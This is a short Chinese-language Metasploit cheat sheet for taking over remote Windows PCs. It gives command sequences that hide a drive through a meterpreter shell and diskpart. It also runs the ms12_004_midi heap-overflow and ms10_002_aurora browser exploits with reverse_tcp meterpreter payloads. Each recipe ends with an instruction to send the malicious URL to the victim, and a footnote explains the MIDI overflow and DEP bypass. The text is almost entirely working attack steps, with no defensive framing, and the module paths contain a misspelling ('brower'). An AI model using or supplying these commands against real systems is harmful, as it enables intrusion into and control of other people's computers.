## 使用Metaspolit隐藏远程PC的驱动器

```bash
meterpreter>shell
diskpart
list volume #显示所有驱动器的列表
select volume 1 #选择要隐藏的驱动器
remove letter e #这里，E 是你要隐藏的驱动器号(Ltr)。
```

## 使用堆溢出攻击破解远程XP [^1]

```bash
use exploit/windows/brower/ms12_004_midi
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.4
set lport 4444
set srvhost 192.168.1.4
set srvport 80
set uripath salesreport
exploit
# 将 url:http://192.168.1.4:80/salesreport 发送给受害者
sessions
```

## 黑客远程PC与操作Aurora攻击(极光行动)

```bash
use exploit/windows/brower/ms10_002_aurora
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.4
set srvhost 192.168.1.4
set uripath meeting
exploit
# 将 url:http://192.168.1.4:8080/meeting 发送给受害者
sessions
```

---

[^1]: 此模块利用Windows多媒体库（winmm.dll）中的堆溢出漏洞。解析特制的MIDI文件时会出现此漏洞。使用Windows Media Player ActiveX控件可以实现远程代码执行。通过提供具有特定事件的特制MIDI文件来完成开发，导致偏移计算高于堆上可用的值（由WINMM！winmmAlloc分配的0x400），然后允许我们“inc al”或“dec al” “一个字节。这可以用来破坏我们设置的数组（CImplAry），并强制浏览器混淆tagVARIANT对象中的类型，这些对象利用用户上下文中的远程代码执行。注意：此时，对于IE 8目标，您可以选择JRE ROP或msvcrt ROP来绕过DEP（数据执行保护）